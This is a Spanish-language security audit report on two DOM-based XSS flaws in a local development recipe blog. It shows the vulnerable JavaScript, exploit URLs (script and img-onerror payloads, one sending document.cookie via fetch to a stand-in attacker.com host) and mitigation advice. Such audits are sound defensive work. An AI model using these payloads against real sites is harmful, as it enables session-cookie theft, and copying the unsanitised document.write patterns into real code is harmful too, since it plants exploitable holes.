# Informe de Auditoría de Seguridad - Cross-Site Scripting (XSS)

**Fecha:** 2026-04-30 15:52:20  
**Objetivo:** http://web.dev.local:8082  
**Tipo de análisis:** Vulnerabilidades Cross-Site Scripting (XSS)  
**Estado:** VULNERABILIDADES ENCONTRADAS ✅

---

## 1. Resumen Ejecutivo

Se han identificado **dos vulnerabilidades XSS** en la aplicación web "Blog de Recetas" alojada en `http://web.dev.local:8082`. Ambas son de tipo DOM-based y permiten la ejecución de código JavaScript arbitrario en el navegador de cualquier visitante que acceda a una URL maliciosa o visite la página tras un comentario malicioso.

---

## 2. Descripción de la Aplicación

La aplicación es un blog de recetas que ofrece:
- Un formulario de **búsqueda de recetas** (parámetro GET `search`)
- Un formulario de **comentarios** (parámetros GET `name` y `comment`)

Ambas funcionalidades procesan entrada del usuario directamente en JavaScript del lado del cliente sin ningún tipo de sanitización o codificación HTML.

---

## 3. Vulnerabilidades Encontradas

### 3.1. Reflected XSS (DOM-based) - Parámetro `search`

**Severidad:** Alta  
**Tipo:** Reflected / DOM-based XSS  
**Parámetro vulnerable:** `search` (GET)

**Descripción:**  
El término de búsqueda proporcionado en la URL es leído directamente mediante `URLSearchParams.get('search')` y concatenado sin sanitización en una llamada a `document.write()`:

```javascript
const searchTerm = urlParams.get('search');
if (searchTerm) {
    document.write('<p>Resultados para: <strong>' + searchTerm + '</strong></p>');
}
```

Cualquier payload HTML/JavaScript en el parámetro `search` se interpreta directamente por el navegador.

**Payload de explotación:**
```
http://web.dev.local:8082/?search=<script>alert('XSS-Reflected')</script>
```

**Payload alternativo (sin etiqueta script):**
```
http://web.dev.local:8082/?search=<img src=x onerror=alert(document.cookie)>
```

**Impacto:**
- Robo de cookies de sesión
- Redirección a sitios maliciosos
- Defacement de la página
- Phishing y robo de credenciales
- Ejecución de keyloggers en el navegador de la víctima

---

### 3.2. Stored XSS (DOM-based via localStorage) - Parámetros `name` y `comment`

**Severidad:** Alta  
**Tipo:** Stored / DOM-based XSS (persistencia en localStorage)  
**Parámetros vulnerables:** `name` y `comment` (GET)

**Descripción:**  
Los comentarios enviados a través del formulario se almacenan en `localStorage` sin sanitización y se muestran posteriormente en la página usando `document.write()`:

```javascript
// Almacenamiento sin sanitización
comments.push({ name: name, comment: comment, date: new Date().toLocaleString() });
localStorage.setItem('comments', JSON.stringify(comments));

// Renderizado sin sanitización
document.write('<div class="comment-author">' + c.name + '</div>');
document.write('<div>' + c.comment + '</div>');
```

Aunque la persistencia es local (localStorage del navegador de la víctima), el vector de ataque más peligroso es que el atacante puede enviar un enlace con parámetros maliciosos, que al ser visitados, almacenan el payload XSS en el localStorage y luego lo ejecutan.

**Payload de explotación:**
```
http://web.dev.local:8082/?name=Atacante&comment=<script>alert('XSS-Stored')</script>
```

**Payload avanzado (robo de datos):**
```
http://web.dev.local:8082/?name=Admin&comment=<img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">
```

**Impacto:**
- Persistencia del payload XSS en el navegador de la víctima
- Ejecución del código malicioso en cada visita posterior a la página
- Mismo impacto que el XSS reflejado pero con mayor persistencia

---

## 4. Evidencia de Explotación

### Código vulnerable identificado

**Vulnerabilidad 1 - Búsqueda:**
```javascript
const urlParams = new URLSearchParams(window.location.search);
const searchTerm = urlParams.get('search');

if (searchTerm) {
    // VULNERABLE: searchTerm no se sanitiza antes de insertarse en el DOM
    document.write('<p>Resultados para: <strong>' + searchTerm + '</strong></p>');
}
```

**Vulnerabilidad 2 - Comentarios:**
```javascript
const name = urlParams.get('name');
const comment = urlParams.get('comment');

if (name && comment) {
    let comments = JSON.parse(localStorage.getItem('comments') || '[]');
    // VULNERABLE: name y comment se almacenan sin sanitización
    comments.push({ name: name, comment: comment, date: new Date().toLocaleString() });
    localStorage.setItem('comments', JSON.stringify(comments));
}

// VULNERABLE: datos de localStorage se insertan sin sanitización en el DOM
document.write('<div class="comment-author">' + c.name + '</div>');
document.write('<div>' + c.comment + '</div>');
```

---

## 5. Clasificación OWASP

| Vulnerabilidad | OWASP Top 10 | CWE |
|---|---|---|
| Reflected XSS (search) | A03:2021 – Injection | CWE-79 |
| Stored XSS (comments via localStorage) | A03:2021 – Injection | CWE-79 |

---

## 6. Recomendaciones de Mitigación

### 6.1. Sanitización de entrada
Utilizar funciones de escape HTML antes de insertar cualquier dato de usuario en el DOM:

```javascript
function escapeHtml(text) {
    const map = {
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#039;'
    };
    return text.replace(/[&<>"']/g, function(m) { return map[m]; });
}

// Uso correcto:
document.write('<p>Resultados para: <strong>' + escapeHtml(searchTerm) + '</strong></p>');
```

### 6.2. Evitar `document.write()`
Preferir métodos seguros como `textContent` en lugar de `innerHTML` o `document.write()`:

```javascript
const resultDiv = document.createElement('div');
const p = document.createElement('p');
const strong = document.createElement('strong');
strong.textContent = searchTerm; // textContent es seguro
p.appendChild(document.createTextNode('Resultados para: '));
p.appendChild(strong);
resultDiv.appendChild(p);
document.getElementById('results').appendChild(resultDiv);
```

### 6.3. Content Security Policy (CSP)
Implementar cabeceras CSP para limitar la ejecución de scripts inline:

```
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
```

### 6.4. Validación del lado del servidor
No confiar únicamente en la validación del lado del cliente. Implementar validación y sanitización en el servidor.

---

## 7. Conclusión

La aplicación `http://web.dev.local:8082` presenta **vulnerabilidades XSS críticas** en dos puntos de entrada (búsqueda y comentarios). Ambas vulnerabilidades son fácilmente explotables y podrían permitir a un atacante robar cookies, redirigir usuarios, o ejecutar código malicioso en el navegador de las víctimas. Se recomienda aplicar las correcciones indicadas con carácter urgente.

---

*Informe generado automáticamente por análisis de seguridad el 2026-04-30 15:52:20*
